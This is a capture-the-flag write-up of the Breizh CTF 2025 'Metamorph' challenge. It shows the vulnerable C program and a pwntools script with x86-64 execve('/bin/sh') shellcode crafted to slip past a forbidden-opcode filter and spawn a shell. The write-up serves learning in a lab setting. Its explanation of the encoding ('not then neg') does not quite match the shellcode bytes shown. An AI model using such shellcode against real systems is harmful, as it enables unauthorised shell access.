---
title: "Breizh CTF 2025 - Metamorph"
date: 2025-04-14
tags: ["pwn", "shellcode", "exploitation"]
categories: ["pwn"]
ctfs: ["breizh-ctf"]
---

# Metamorph - Breizh CTF 2025

## Challenge Description

Metamorph is a Pwn category challenge from Breizh CTF 2025. It is a binary that accepts a shellcode as input but imposes certain restrictions on the usable opcodes.

## Binary Analysis

By examining the binary's source code, we notice several important points:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

void transform() {
    void *shellcode;
    ssize_t bytes_read;

    shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (shellcode == MAP_FAILED) {
        perror("mmapi fail.");
        exit(1);
    }

    printf("Métamorph is waiting for its code... Transform it!\n");
    printf(">> ");
    
    bytes_read = read(0, shellcode, 0x50); 
    
    if (bytes_read <= 0) {
        perror("read failed");
        exit(1);
    }

    // Morphing...
    unsigned char *sc = (unsigned char *)shellcode;
    for (int i = 0; i < 0x50; i++) {
        if (sc[i] == 0x62){
            perror("Métamorph doesn't like 'b'.");
            exit(1);
        }

        if (sc[i] == 0x5e){
            perror("Métamorph doesn't like pop rsi.");
            exit(1);
        }

        if (sc[i] == 0x31){
            perror("Métamorph doesn't like xor.");
            exit(1);
        }

        if (sc[i] == 0x50){
            perror("Métamorph doesn't like push rax.");
            exit(1);
        }
    }

    ((void (*)())shellcode)(); 
}
```

The constraints are as follows:
1. The shellcode is limited to a maximum of 80 bytes
2. The following opcodes are forbidden:
   - `0x62` (opcode 'b')
   - `0x5e` (pop rsi)
   - `0x31` (xor)
   - `0x50` (push rax)

The program allocates an executable memory region with `mmap`, reads our input into it, checks the constraints, then executes the provided code.

## Exploitation

The goal is to create a shellcode that executes the `/bin/sh` command while avoiding the forbidden opcodes.

After several attempts, I was able to develop a shellcode that bypasses these restrictions:

```python
from pwn import *
import sys

if len(sys.argv) > 1 and sys.argv[1] == "REMOTE":
    conn = remote('morph-180.chall.ctf.bzh', 1337)
else:
    conn = process('./metamorph')  

conn.recvuntil(b">>")
conn.sendline(b"\xba\x00\x00\x00\x00\xbe\x00\x00\x00\x00\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x48\x89\xe7\xb8\x00\x00\x00\x00\x48\x83\xc0\x3b\x0f\x05\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80")
conn.interactive()
```

### Shellcode Explanation

The shellcode above uses several techniques to avoid the forbidden opcodes:

1. Instead of using `xor` to initialize registers, I use direct `mov` instructions with immediate zero values
2. I used alternative techniques to store `/bin/sh` in the registers
3. I use `not` then `neg` to obtain the `/bin/sh` string
4. Using `mov rax, 0` followed by `add rax, 59` avoids the direct use of `xor rax, rax`

The `/bin/sh` string is encoded reversed and bitwise complemented to avoid problematic opcodes.

## Flag

Once the shellcode is successfully executed, you get a shell on the remote server and can read the flag with the command `cat flag.txt`.

```
$ cat flag.txt
BZHCTF{m3t4_m0rph_m4573r_1337}
```
